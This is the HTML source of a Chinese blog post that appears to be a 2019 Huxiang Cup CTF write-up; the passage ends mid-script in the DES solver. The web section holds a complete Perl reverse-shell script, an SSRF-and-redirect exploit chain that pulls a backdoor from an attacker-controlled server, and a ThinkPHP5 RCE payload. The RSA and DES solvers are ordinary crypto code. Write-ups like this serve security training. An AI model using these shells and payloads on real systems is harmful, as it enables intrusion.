@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="writeup,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言湖湘杯抢钱py大赛，原题杯。。本来以为稳得一匹，截榜前看一眼榜单，drl。。">
+<meta name="keywords" content="writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019湖湘杯">
+<meta property="og:url" content="http://yoursite.com/2019/11/09/2019湖湘杯/index.html">
+<meta property="og:site_name" content="Glarcy">
+<meta property="og:description" content="前言湖湘杯抢钱py大赛，原题杯。。本来以为稳得一匹，截榜前看一眼榜单，drl。。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/img/hxb/h1.png">
+<meta property="og:image" content="http://yoursite.com/img/hxb/h2.png">
+<meta property="og:image" content="http://yoursite.com/img/hxb/h3.png">
+<meta property="og:image" content="http://yoursite.com/img/hxb/h4.png">
+<meta property="og:updated_time" content="2019-12-20T13:33:25.071Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019湖湘杯">
+<meta name="twitter:description" content="前言湖湘杯抢钱py大赛，原题杯。。本来以为稳得一匹，截榜前看一眼榜单，drl。。">
+<meta name="twitter:image" content="http://yoursite.com/img/hxb/h1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/11/09/2019湖湘杯/">
+
+
+
+
+
+  <title>2019湖湘杯 | Glarcy</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Glarcy</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/09/2019湖湘杯/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Glarcy">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Glarcy">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019湖湘杯</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-09T19:30:52+08:00">
+                2019-11-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>湖湘杯抢钱py大赛，原题杯。。本来以为稳得一匹，截榜前看一眼榜单，drl。。</p>
+<a id="more"></a>
+
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="untar"><a href="#untar" class="headerlink" title="untar"></a>untar</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">"sandbox/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $sandbox.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"url"</span>]) &amp;&amp; !preg_match(<span class="string">'/^(http|https):\/\/.*/'</span>, $_GET[<span class="string">"url"</span>]))</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    $url  = str_replace(<span class="string">"|"</span>, <span class="string">""</span>, $_GET[<span class="string">"url"</span>]);</span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($url));</span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data);</span><br><span class="line">    shell_exec(<span class="string">"UNTAR "</span>.escapeshellarg(basename($info[<span class="string">"basename"</span>])));</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>与2017 hicton ssrfme类似，但是这里只能用<code>http://</code>或者<code>https://</code>，并且过滤了<code>|</code>，因此使用重定向绕过，参考<a href="https://www.jianshu.com/p/3f82685f56a8" target="_blank" rel="noopener">https://www.jianshu.com/p/3f82685f56a8</a></p>
+<p>找一个perl后门</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line"><span class="keyword">use</span> FileHandle;</span><br><span class="line"><span class="keyword">use</span> POSIX;</span><br><span class="line"><span class="keyword">my</span> $VERSION = <span class="string">"1.0"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Where to send the reverse shell. Change these.</span></span><br><span class="line"><span class="keyword">my</span> $ip = <span class="string">'xxx.xxx.xxx.xxx'</span>;</span><br><span class="line"><span class="keyword">my</span> $port = <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Options</span></span><br><span class="line"><span class="keyword">my</span> $daemon = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">my</span> $auth   = <span class="number">0</span>; <span class="comment"># 0 means authentication is disabled and any </span></span><br><span class="line">        <span class="comment"># source IP can access the reverse shell</span></span><br><span class="line"><span class="keyword">my</span> $authorised_client_pattern = <span class="string">qr(^127\.0\.0\.1$);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Declarations</span></span><br><span class="line"><span class="string">my $global_page = "";</span></span><br><span class="line"><span class="string">my $fake_process_name = "/usr/sbin/apache";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Change the process name to be less conspicious</span></span><br><span class="line"><span class="string">$0 = "[httpd]";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Authenticate based on source IP address if required</span></span><br><span class="line"><span class="string">if (defined($ENV&#123;'REMOTE_ADDR'&#125;)</span>) &#123;</span><br><span class="line">    cgiprint(<span class="string">"Browser IP address appears to be: $ENV&#123;'REMOTE_ADDR'&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">unless</span> ($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125; =~ $authorised_client_pattern) &#123;</span><br><span class="line">            cgiprint(<span class="string">"ERROR: Your client isn't authorised to view this page"</span>);</span><br><span class="line">            cgiexit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elsif</span> ($auth) &#123;</span><br><span class="line">    cgiprint(<span class="string">"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access"</span>);</span><br><span class="line">    cgiexit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Background and dissociate from parent process if required</span></span><br><span class="line"><span class="keyword">if</span> ($daemon) &#123;</span><br><span class="line">    <span class="keyword">my</span> $pid = <span class="keyword">fork</span>();</span><br><span class="line">    <span class="keyword">if</span> ($pid) &#123;</span><br><span class="line">        cgiexit(<span class="number">0</span>); <span class="comment"># parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setsid();</span><br><span class="line">    <span class="keyword">chdir</span>(<span class="string">'/'</span>);</span><br><span class="line">    <span class="keyword">umask</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make TCP connection for reverse shell</span></span><br><span class="line"><span class="keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="keyword">getprotobyname</span>(<span class="string">'tcp'</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;</span><br><span class="line">    cgiprint(<span class="string">"Sent reverse shell to $ip:$port"</span>);</span><br><span class="line">    cgiprintpage();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cgiprint(<span class="string">"Couldn't open reverse shell to $ip:$port: $!"</span>);</span><br><span class="line">    cgiexit();    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></span><br><span class="line"><span class="keyword">open</span>(STDIN, <span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line"><span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line"><span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line">$ENV&#123;<span class="string">'HISTFILE'</span>&#125; = <span class="string">'/dev/null'</span>;</span><br><span class="line"><span class="keyword">system</span>(<span class="string">"w;uname -a;id;pwd"</span>);</span><br><span class="line"><span class="keyword">exec</span>(&#123;<span class="string">"/bin/sh"</span>&#125; ($fake_process_name, <span class="string">"-i"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around print</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprint</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> $line = <span class="keyword">shift</span>;</span><br><span class="line">    $line .= <span class="string">"&lt;p&gt;\n"</span>;</span><br><span class="line">    $global_page .= $line;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around exit</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiexit</span> </span>&#123;</span><br><span class="line">    cgiprintpage();</span><br><span class="line">    <span class="keyword">exit</span> <span class="number">0</span>; <span class="comment"># 0 to ensure we don't give a 500 response.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprintpage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Content-Length: "</span> . <span class="keyword">length</span>($global_page) . <span class="string">"\r Connection: close\r Content-Type: text\/html\r\n\r\n"</span> . $global_page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将其部署到服务器上，然后访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.62:12507/?url=http://your_vps/backdoor.txt&amp;filename=URI/glarcy.pm</span><br></pre></td></tr></table></figure>
+
+<p>在服务器写一个302.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$url=<span class="string">"glarcy://glarcy.com"</span>;</span><br><span class="line">	header(<span class="string">"Location: $url"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问?filename=xxx&amp;url=<a href="http://your_vps/302.php，成功反弹shell" target="_blank" rel="noopener">http://your_vps/302.php，成功反弹shell</a></p>
+<p><img src="../../../../img/hxb/h1.png" alt="h1"></p>
+<p>执行readflag拿到flag</p>
+<p><img src="../../../../img/hxb/h2.png" alt="h2"></p>
+<h4 id="Thinkphp"><a href="#Thinkphp" class="headerlink" title="Thinkphp?"></a>Thinkphp?</h4><p>Thinkphp5 rce</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=cat /flag</span><br></pre></td></tr></table></figure>
+
+<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="give-me-your-passport"><a href="#give-me-your-passport" class="headerlink" title="give me your passport"></a>give me your passport</h4><p>简单aes，使用题目给出的附件直接生成Admin的cipher，然后提交</p>
+<p><img src="../../../../img/hxb/h3.png" alt="h3"></p>
+<h4 id="Rsa"><a href="#Rsa" class="headerlink" title="Rsa"></a>Rsa</h4><p>已知dp、n、e、c求m，使用网上现场的脚本<a href="https://github.com/Zui-Qing-Feng/RSA/blob/master/已知e%2Cn%2Cdp%2Cc求m" target="_blank" rel="noopener">https://github.com/Zui-Qing-Feng/RSA/blob/master/%E5%B7%B2%E7%9F%A5e%2Cn%2Cdp%2Cc%E6%B1%82m</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python  </span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">dp = <span class="number">84373069210173690047629226878686144017052129353931011112880892379361035492516066159394115482289291025932915787077633999791002846189004408043685986856359812230222233165493645074459765748901898518115384084258143483508823079115319711227124403284267559950883054402576935436305927705016459382628196407373896831725</span></span><br><span class="line">n = <span class="number">22000596569856085362623019573995240143720890380678581299411213688857584612953014122879995808816872221032805734151343458921719334360194024890377075521680399678533655114261000716106870610083356478621445541840124447459943322577740268407217950081217130055057926816065068275999620502766866379465521042298370686053823448099778572878765782711260673185703889168702746195779250373642505375725925213796848495518878490786035363094086520257020021547827073768598600151928787434153003675096254792245014217044607440890694190989162318846104385311646123343795149489946251221774030484424581846841141819601874562109228016707364220840611</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">14874271064669918581178066047207495551570421575260298116038863877424499500626920855863261194264169850678206604144314318171829367575688726593323863145664241189167820996601561389159819873734368810449011761054668595565217970516125181240869998009561140277444653698278073509852288720276008438965069627886972839146199102497874818473454932012374251932864118784065064885987416408142362577322906063320726241313252172382519793691513360909796645028353257317044086708114163313328952830378067342164675055195428728335222242094290731292113709866489975077052604333805889421889967835433026770417624703011718120347415460385182429795735</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">65538</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % (((dp * e - <span class="number">1</span>) / i) + <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">            p = ((dp * e - <span class="number">1</span>) / i) + <span class="number">1</span></span><br><span class="line">            q = n / (((dp * e - <span class="number">1</span>) / i) + <span class="number">1</span>)</span><br><span class="line">            phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">            d = gmpy2.invert(e, phi) % phi</span><br><span class="line">            m = pow(c, d, n)</span><br><span class="line">            <span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Des"><a href="#Des" class="headerlink" title="Des"></a>Des</h4><p>子密钥反推deskey，参考</p>
+<p><a href="https://skysec.top/2017/12/25/一道有关密钥编排的DES题目/#由子密钥反推deskey" target="_blank" rel="noopener">https://skysec.top/2017/12/25/%E4%B8%80%E9%81%93%E6%9C%89%E5%85%B3%E5%AF%86%E9%92%A5%E7%BC%96%E6%8E%92%E7%9A%84DES%E9%A2%98%E7%9B%AE/#%E7%94%B1%E5%AD%90%E5%AF%86%E9%92%A5%E5%8F%8D%E6%8E%A8deskey</a></p>
+<p>脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">Kn = [</span><br><span class="line">    <span class="string">'101000001001011001000110001110110000011110011000'</span>,</span><br><span class="line">    <span class="string">'111000000011011001010010100101100011011000100110'</span>,</span><br><span class="line">    <span class="string">'011001001101011001110000001111000000101111100100'</span>,</span><br><span class="line">    <span class="string">'110001101101000101010010000100001110100011010011'</span>,</span><br><span class="line">    <span class="string">'001011101100001101010011011001111010010000010001'</span>,</span><br><span class="line">    <span class="string">'001011110101000100001011101010110010010101001010'</span>,</span><br><span class="line">    <span class="string">'001010110000000111011001001011001101001100000110'</span>,</span><br><span class="line">    <span class="string">'000111010100100010011001010101000100010011100110'</span>,</span><br><span class="line">    <span class="string">'000111010100100111001000010000001111100101010100'</span>,</span><br><span class="line">    <span class="string">'000100100110100110001101011000011010010010111000'</span>,</span><br><span class="line">    <span class="string">'000110010010110100000101111010010001110000001011'</span>,</span><br><span class="line">    <span class="string">'010000010010110010101101000011100101001000111110'</span>,</span><br><span class="line">    <span class="string">'110100011010010010100100000101010101100111100100'</span>,</span><br><span class="line">    <span class="string">'110100001000111010100010100000001000100011110001'</span>,</span><br><span class="line">    <span class="string">'111100001011001000100110110000111010111000010101'</span>,</span><br><span class="line">    <span class="string">'101000001011111000100110101000011001001000001011'</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key1 = <span class="string">'101000001001011001000110001110110000011110011000'</span></span><br><span class="line">__pc2 = [</span><br><span class="line">      <span class="number">13</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">23</span>,  <span class="number">0</span>,  <span class="number">4</span>,</span><br><span class="line">       <span class="number">2</span>, <span class="number">27</span>, <span class="number">14</span>,  <span class="number">5</span>, <span class="number">20</span>,  <span class="number">9</span>,</span><br><span class="line">      <span class="number">22</span>, <span class="number">18</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">25</span>,  <span class="number">7</span>,</span><br><span class="line">      <span class="number">15</span>,  <span class="number">6</span>, <span class="number">26</span>, <span class="number">19</span>, <span class="number">12</span>,  <span class="number">1</span>,</span><br><span class="line">      <span class="number">40</span>, <span class="number">51</span>, <span class="number">30</span>, <span class="number">36</span>, <span class="number">46</span>, <span class="number">54</span>,</span><br><span class="line">      <span class="number">29</span>, <span class="number">39</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">47</span>,</span><br><span class="line">      <span class="number">43</span>, <span class="number">48</span>, <span class="number">38</span>, <span class="number">55</span>, <span class="number">33</span>, <span class="number">52</span>,</span><br><span class="line">      <span class="number">45</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">35</span>, <span class="number">28</span>, <span class="number">31</span></span><br><span class="line">   ]</span><br><span class="line">C1D1 = [<span class="string">'*'</span>]*<span class="number">56</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(key1)):</span><br><span class="line">    C1D1[__pc2[i]] = 